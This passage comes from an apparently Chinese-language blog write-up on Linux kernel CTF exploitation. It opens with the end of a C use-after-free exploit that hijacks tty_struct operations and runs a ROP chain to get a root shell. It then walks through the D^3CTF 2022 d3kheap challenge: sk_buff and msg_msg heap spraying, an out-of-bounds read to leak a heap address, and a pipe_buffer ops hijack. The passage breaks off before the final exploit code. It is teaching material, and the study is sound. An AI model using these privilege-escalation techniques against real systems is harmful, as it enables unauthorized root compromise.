__asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  info_log(<span class="hljs-string">&quot;Status has been saved Successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  saveStatus();<br>  <span class="hljs-type">int</span> i; <br><br>  <span class="hljs-type">size_t</span> buff[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">size_t</span> fake_tty_operations[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  PRINT_ADDR(<span class="hljs-string">&quot;fake_tty_operations&quot;</span>, fake_tty_operations);<br>  <span class="hljs-type">size_t</span> tty_struct_padding[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <br>  <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>  rop[p++] = pop_rdi;<br>  rop[p++] = <span class="hljs-number">0x6f0</span>;<br>  rop[p++] = mov_rc4_rdi_pop_rbp;<br>  rop[p++] =((<span class="hljs-type">size_t</span>)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = getRootPrivilige;<br>  rop[p++] = swapgs_pop_rbp;<br>  rop[p++] = ((<span class="hljs-type">size_t</span>)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = iretq;<br>  rop[p++] = get_shell;<br>  rop[p++] = user_cs;<br>  rop[p++] = user_rflags;<br>  rop[p++] = user_sp;<br>  rop[p++] = user_cs;<br><br><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)&#123;<br>    fake_tty_operations[i] = mov_rsp_rax_ret;<br>  &#125;<br>  fake_tty_operations[<span class="hljs-number">0</span>] = pop_rax_ret;<br>  fake_tty_operations[<span class="hljs-number">1</span>] = rop;<br>  <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>  ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>  close(fd1);<br>  <span class="hljs-comment">//alloc the UAF chunk to tty_struct</span><br>  <span class="hljs-type">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>  <br>  <span class="hljs-comment">//overwrite the tty_struct-&gt;ops</span><br>  read(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  tty_struct_padding[<span class="hljs-number">3</span>] = fake_tty_operations;<br>  write(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  write(fd3, buff, <span class="hljs-number">0x10</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<h2 id="例题：D-3CTF-kheap"><a href="#例题：D-3CTF-kheap" class="headerlink" title="例题：D^3CTF - kheap"></a>例题：D^3CTF - kheap</h2><h3 id="1-题目逆向-1"><a href="#1-题目逆向-1" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><p>首先查看其中运行脚本</p>
<p>开启smep、smap、kaslr、pti,双核双线程、monitor置为null</p>
<p>然后我们再查看出题者贴心的提供给我们的内核配置信息</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># D3CTF2022 - d3kheap</span><br><br>baby heap in kernel space, just sign me in plz :)<br><br>Here are some kernel config options you may need<br><br><span class="hljs-code">```</span><br><span class="hljs-code">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="hljs-code">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="hljs-code">CONFIG_SLUB=y</span><br><span class="hljs-code">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="hljs-code">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="hljs-code">CONFIG_HARDENED_USERCOPY=y</span><br><span class="hljs-code">```</span><br><br></code></pre></td></tr></table></figure>

<p>我们发现其中开启了</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br></code></pre></td></tr></table></figure>

<p>其中一个时freelist指针对特定值的异或还有其中分布的随机化</p>
<p>这一手配置，风雨不透啊</p>
<p>然后我们通过文件系统的init脚本可以得知插入了一个d3kheap.ko驱动模块，此时我们基本可以判定漏洞出自于他，接下来咱们继续分析</p>
<p>题目给出的漏洞十分简洁，a3师傅本意是为了使得大家更加专注于漏洞利用，而不是纯粹的逆向代码分析，这点倒是同用户态相反</p>
<p>我们可以通过ioctl来申请一个1k的块，然后我们有着两次kfree的机会，且存在UAF，那么就是这样一个十分明显的漏洞，我们的重心得以转到如何去利用它这点</p>
<h3 id="2-socketpair基础知识"><a href="#2-socketpair基础知识" class="headerlink" title="2.socketpair基础知识"></a>2.socketpair基础知识</h3><p>该系统调用通常被用来进行Linux网络编程，个人感觉有点类似于进程间通信的pipe，同样都是进行通信，但是socketpair支持全双工通信</p>
<p>他的使用也同pipe类似，通过传入一个大小为2的数组来分别作为读写fd指针，其调用如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SYSCALL_DEFINE4(socketpair, <span class="hljs-type">int</span>, <span class="hljs-keyword">family</span>, <span class="hljs-type">int</span>, <span class="hljs-keyword">type</span>, <span class="hljs-type">int</span>, protocol,<br>		<span class="hljs-type">int</span> __user *, usockvec)<br>&#123;<br>	<span class="hljs-keyword">return</span> __sys_socketpair(<span class="hljs-keyword">family</span>, <span class="hljs-keyword">type</span>, protocol, usockvec);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里仅仅给出系统调用的声明部分</p>
<h3 id="3-sk-buff基础知识"><a href="#3-sk-buff基础知识" class="headerlink" title="3.sk_buff基础知识"></a>3.sk_buff基础知识</h3><p>他被多次应用于网络消息传递的过程中，其中在我们读写上面的socketpair的时候同样会用到，我们来查看一下他的结构体内容，也由于太长我就不放太多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-comment">/* These two members must be first. */</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>		*<span class="hljs-title">next</span>;</span><br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>		*<span class="hljs-title">prev</span>;</span><br><br>			<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>				<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span>	*<span class="hljs-title">dev</span>;</span><br>				<span class="hljs-comment">/* Some protocols might use this space to store information,</span><br><span class="hljs-comment">				 * while device pointer would be NULL.</span><br><span class="hljs-comment">				 * UDP receive path is one user.</span><br><span class="hljs-comment">				 */</span><br>				<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		dev_scratch;<br>			&#125;;<br>		&#125;;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span>		<span class="hljs-title">rbnode</span>;</span> <span class="hljs-comment">/* used in netem, ip4 defrag, and tcp stack */</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>	<span class="hljs-title">list</span>;</span><br>	&#125;;<br><br><br>	<span class="hljs-comment">/* These elements must be at the end, see alloc_skb() for details.  */</span><br>	<span class="hljs-type">sk_buff_data_t</span>		tail;<br>	<span class="hljs-type">sk_buff_data_t</span>		end;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>		*head,<br>				*data;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		truesize;<br>	<span class="hljs-type">refcount_t</span>		users;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span><br>	<span class="hljs-comment">/* only useable after checking -&gt;active_extensions != 0 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skb_ext</span>		*<span class="hljs-title">extensions</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>next:用作同其他sk_buff进行链接，就如同msg_msg一样类似</li>
<li>prev:同上</li>
<li>tail:指向数据区中实际数据结束的地方</li>
<li>end:指向数据区中结束的地方（这里是非实际的，具体在下面讲解）</li>
<li>head:指向数据区中开始的地方（非实际）</li>
<li>data:指向数据区中实际数据开始的地方</li>
</ul>
<p>当我们利用上面的系统调用进行write的时候，也就是发送包的过程，就会调用其中的一个函数 <code>alloc_skb</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_skb - allocate a network buffer</span><br><span class="hljs-comment"> * @size: size to allocate</span><br><span class="hljs-comment"> * @priority: allocation mask</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function is a convenient wrapper around __alloc_skb().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> sk_buff *<span class="hljs-title function_">alloc_skb</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params">					<span class="hljs-type">gfp_t</span> priority)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __alloc_skb(size, priority, <span class="hljs-number">0</span>, NUMA_NO_NODE);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里主要是调用 <code>__alloc_skb</code>，我们继续查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 	Allocate a new skbuff. We do this ourselves so we can fill in a few</span><br><span class="hljs-comment"> *	&#x27;private&#x27; fields and also do memory statistics to find all the</span><br><span class="hljs-comment"> *	[BEEP] leaks.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	__alloc_skb	-	allocate a network buffer</span><br><span class="hljs-comment"> *	@size: size to allocate</span><br><span class="hljs-comment"> *	@gfp_mask: allocation mask</span><br><span class="hljs-comment"> *	@flags: If SKB_ALLOC_FCLONE is set, allocate from fclone cache</span><br><span class="hljs-comment"> *		instead of head cache and allocate a cloned (child) skb.</span><br><span class="hljs-comment"> *		If SKB_ALLOC_RX is set, __GFP_MEMALLOC will be used for</span><br><span class="hljs-comment"> *		allocations in case the data is required for writeback</span><br><span class="hljs-comment"> *	@node: numa node to allocate memory on</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *	Allocate a new &amp;sk_buff. The returned buffer has no headroom and a</span><br><span class="hljs-comment"> *	tail room of at least size bytes. The object has a reference count</span><br><span class="hljs-comment"> *	of one. The return is the buffer. On a failure the return is %NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *	Buffers may only be allocated from interrupts using a @gfp_mask of</span><br><span class="hljs-comment"> *	%GFP_ATOMIC.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *__<span class="hljs-title">alloc_skb</span>(<span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">size</span>, <span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>,</span><br><span class="hljs-class">			    <span class="hljs-title">int</span> <span class="hljs-title">flags</span>, <span class="hljs-title">int</span> <span class="hljs-title">node</span>)</span><br><span class="hljs-class">&#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">cache</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *<span class="hljs-title">skb</span>;</span><br>	u8 *data;<br>	<span class="hljs-type">bool</span> pfmemalloc;<br><br>	cache = (flags &amp; SKB_ALLOC_FCLONE)<br>		? skbuff_fclone_cache : skbuff_head_cache;<br><br>	...<br>        <br>	<span class="hljs-keyword">else</span><br>		skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);<br>	<span class="hljs-keyword">if</span> (unlikely(!skb))<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	prefetchw(skb);<br><br>	<span class="hljs-comment">/* We do our best to align skb_shared_info on a separate cache</span><br><span class="hljs-comment">	 * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span><br><span class="hljs-comment">	 * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span><br><span class="hljs-comment">	 * Both skb-&gt;head and skb_shared_info are cache line aligned.</span><br><span class="hljs-comment">	 */</span><br>	size = SKB_DATA_ALIGN(size);<br>	size += SKB_DATA_ALIGN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> skb_shared_info));<br>	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们重点关注以上代码，我们知道当我们分配这个 <code>struct sk_buff</code>结构体的时候，他会从自带的cache当中分配，但是当我们分配数据部分的时候，他会调用 <code>kmalloc_reserve</code>进行分配，该函数则会从通用的kmem_cache当中申请，这里他的大小会首先进行对齐然后加上一个 <code>struct skb_shared_info</code>大小的结构体，然后再进行分配，该结构体大小为320字节</p>
<p>所以我们的一个大致 <code>sk_buff + data</code>的分配情况如下：</p>
<p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" srcset="/img/loading.gif" lazyload></p>
<p>而当我们释放的时候只需要调用read读取相应通道包即可。</p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>我们首先可以利用题目中的ioctl来分配一个1k大小的空间，然后直接释放他了再接着分配一个大小为 1k的 <code>msg_msg</code>结构体，他就作为本次题目当中的 <code>victim</code>,但是经过测试在释放过后紧接着分配0x400的msg_msg并不能立刻获取刚刚free掉的kheap块，这一点我在最开始思考的时候也很不解，然后发现有师傅已经提前问了这个问题，据出题者a3师傅所言</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7becb76060d2692eb9389b506b4f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>而我考虑到本题环境是双核双线程，所以我又在启动脚本改为单核单线程后尝试仍然不能立刻分配，这里还存在一定疑问:(</p>
<p>所以由于我们现在并不能知道 哪个<code>msg_queue</code>中的 <code>msg_msg</code>分配到了刚刚free掉的堆块，所以我们需要堆喷 <code>msg_queue</code>，然后再设法找到其中的 <code>victim_msg_queue</code></p>
<p>这里我们利用到 <code>CVE-2021-22555</code>的思路，构造一个主从 <code>msg_msg</code>，如下：</p>
<p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" srcset="/img/loading.gif" lazyload></p>
<p>我们在每个 <code>msg_queue</code>链条上面分配出一个主msg_msg(96)和一个从msg_msg(0x400,同体中所给kheap在同一kmem_cache当中取),这里构造成这样是为了之后能通过他读取 <code>victim msg_msg&#39;s addr</code></p>
<p>然后我们再一次用掉题目中所给出的free机会，我们利用刚刚讲到的 <code>sk_buff</code>，堆喷 <code>sk_buff</code>来试图分配到之前释放掉的kheap，但是此时上面仍存在着msg_msg，因此我们可以填入虚假信息，然后读取每一个 <code>msg_msg</code>，如果读取失败则说明找到了对应的 <code>victim msg_msg</code></p>
<p>当我们找到了对应堆块后，我们可以修改他的 <code>m_ts</code>来造成越界读，我们此时可以读取该 <code>msg_msg</code>相邻的 <code>msg_msg</code>,这里相邻是因为之前我们进行了大量的堆喷，所以这里基本上是存在着相邻情况，当然不排除小概率情形。</p>
<p>首先我们需要知道每个 <code>msg_queue</code>中，msg_msg之间以及头都是靠着双链表进行链接的，也就是 <code>struct msg_msg-&gt;list_head-&gt;*</code>相连</p>
<p>所以我们可以越界读相邻从 <code>msg_msg</code>的prev指针，该指针指向的是该相邻主 <code>msg_msg</code>的所在的地方，因此我们之后再将 <code>victim msg_msg-&gt;next</code>指针修改成他，这样我们就可以成功泄露出相邻从 <code>msg_msg</code>的首地址，然后我们将其首地址减去0x400就得到了我们的 <code>victim msg_msg</code>的地址</p>
<p>知道了我们 <code>victim msg_msg</code>的虚拟地址之后，我们考虑再使用一个结构体，那就是较为流行的 <code>pipe_buffer</code>，该结构体默认首先分配一个大小为0x400的 <code>pipe_buffers</code>数组，而 <code>struct pipe_buffer</code>上又存在着内核基地址，因此我们可以泄露他并且修改 <code>pipe_buffer-&gt;ops</code>函数表，因为我们目前掌握着一个内核堆地址并且可以通过不断释放和堆喷 <code>sk_buff</code>来修改他，所以我们可以很容易的伪造这个函数表，当我们关闭管道两端，他就会调用 <code>pipe_buffer-&gt;ops-&gt;release</code>函数，我们就可以按照正常ROP来完成提权</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8b13632762d0f70301b4f7ef4efa513d2697c5fb.jpg" srcset="/img/loading.gif" lazyload></p>
<p>最终exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span 